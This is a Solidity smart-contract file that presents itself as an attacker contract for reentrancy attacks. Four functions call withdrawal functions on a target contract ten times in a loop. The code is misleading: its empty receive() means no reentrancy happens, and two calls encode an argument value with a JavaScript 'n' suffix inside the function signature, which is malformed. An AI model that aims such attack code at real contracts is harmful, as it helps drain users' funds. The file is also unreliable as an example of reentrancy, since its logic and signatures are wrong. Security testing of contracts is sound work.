// AttackerContract.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerContract {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function setTargetContract(address _targetContract) external {
        targetContract = _targetContract;
    }

    // Function to perform a reentrancy attack
    function attackEth() external {
        // Assume the target contract has a vulnerable withdraw function
        // Here, the attacker contract calls the withdraw function of the target contract in a loop
        for (uint256 i = 0; i < 10; i++) {
            // Perform reentrancy attack by calling the vulnerable function of the target contract
            // This function should be the vulnerable function in the target contract
            (bool successEth, ) = targetContract.call(abi.encodeWithSignature("withdrawSpentEth()"));
          
            require(successEth, "Reentrancy attack failed ETH");

        }
    }

       // Function to perform a reentrancy attack
    function attackIpt() external {
        // Assume the target contract has a vulnerable withdraw function
        // Here, the attacker contract calls the withdraw function of the target contract in a loop
        for (uint256 i = 0; i < 10; i++) {
            // Perform reentrancy attack by calling the vulnerable function of the target contract
            // This function should be the vulnerable function in the target contract
           
            (bool successIpt, ) = targetContract.call(abi.encodeWithSignature("withdrawSpentIpt()"));

            require(successIpt, "Reentrancy attack failed IPT");
        
        }
    }

       // Function to perform a reentrancy attack
    function attackEthUser() external {
        // Assume the target contract has a vulnerable withdraw function
        // Here, the attacker contract calls the withdraw function of the target contract in a loop
        for (uint256 i = 0; i < 10; i++) {
            // Perform reentrancy attack by calling the vulnerable function of the target contract
            // This function should be the vulnerable function in the target contract

            (bool successEthUser, ) = targetContract.call(abi.encodeWithSignature("userEtherWithdrawal(10000000000000n)"));

            require(successEthUser, "Reentrancy attack failed Eth user");
        }
    }

       // Function to perform a reentrancy attack
    function attackIptUser() external {
        // Assume the target contract has a vulnerable withdraw function
        // Here, the attacker contract calls the withdraw function of the target contract in a loop
        for (uint256 i = 0; i < 10; i++) {
            // Perform reentrancy attack by calling the vulnerable function of the target contract
            // This function should be the vulnerable function in the target contract

            (bool successIptUser, ) = targetContract.call(abi.encodeWithSignature("userIptWithdrawal(10000000000000n)"));

            require(successIptUser, "Reentrancy attack failed IPT user");
        }
    }

    // Function to receive Ether
    receive() external payable {}
}